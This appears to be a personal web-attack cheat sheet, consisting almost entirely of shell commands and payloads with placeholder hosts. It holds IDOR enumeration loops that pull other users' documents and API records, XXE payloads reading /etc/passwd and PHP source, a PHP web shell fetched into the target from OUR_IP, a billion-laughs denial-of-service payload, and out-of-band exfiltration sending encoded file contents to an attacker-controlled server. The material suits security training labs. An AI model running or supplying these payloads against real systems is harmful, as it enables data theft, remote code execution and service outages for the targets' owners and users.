# Web-Attacks

###

```shell
  # Change request method and also discover what methods are available
  curl -i -X OPTIONS http://SERVER_IP:PORT/
```

---

### IDOR

```shell
  curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
  curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -');
    do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done

  # Get the request modify request method and also the id parameters


  #!/bin/bash
  for uid in {1..100}; do
  	curl -s "http://STMIP:STMPO/api.php/user/$uid"; echo
  done

  bash fuzz | grep -i "admin" | jq .
```

### XXE

```shell

  # then use the &<entity_name>;
  
  <!DOCTYPE email [
    <!ENTITY company SYSTEM "file:///etc/passwd">
  ]>

  <!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
  ]>

  echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
  sudo python3 -m http.server 80

  <?xml version="1.0"?>
  <!DOCTYPE email [
    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
  ]>

  # DOS
  <?xml version="1.0"?>
  <!DOCTYPE email [
    <!ENTITY a0 "DOS" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
    <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
    <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
    <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
    <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
    <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
    <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
  ]>


  # Advanced chained exploits
  <!DOCTYPE email [
    <!ENTITY begin "<![CDATA[">
    <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
    <!ENTITY end "]]>">
    <!ENTITY joined "&begin;&file;&end;">
  ]>

  echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
  python3 -m http.server 8000
  <!DOCTYPE email [
    <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
    <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
    <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
    %xxe;
  ]>

  # Blind dat a exfiltration
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE email [ 
    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %remote;
    %oob;
  ]>
  <root>&content;</root>

  git clone https://github.com/enjoiz/XXEinjector.git
  ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
